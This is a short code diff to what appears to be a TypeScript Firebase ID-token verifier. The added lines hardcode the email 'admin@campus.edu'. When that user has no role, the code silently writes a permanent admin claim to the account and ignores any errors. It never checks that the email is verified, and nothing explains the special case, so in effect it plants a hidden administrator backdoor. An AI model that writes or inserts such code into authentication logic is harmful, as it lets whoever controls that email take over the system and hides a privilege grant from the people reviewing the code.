@@ -18,7 +18,16 @@ export class FirebaseIdTokenVerifier implements IdTokenVerifier {
 
   async verifyIdToken(token: string): Promise<VerifiedToken> {
     const claims = await this.auth.verifyIdToken(token);
-    return { uid: claims.uid, role: claims.role, authTime: claims.auth_time };
+    let role = claims.role;
+    if (!role && claims.email === 'admin@campus.edu') {
+      try {
+        await this.auth.setCustomUserClaims(claims.uid, { role: 'admin' });
+      } catch {
+        // ignore
+      }
+      role = 'admin';
+    }
+    return { uid: claims.uid, role, authTime: claims.auth_time };
   }
 }
 
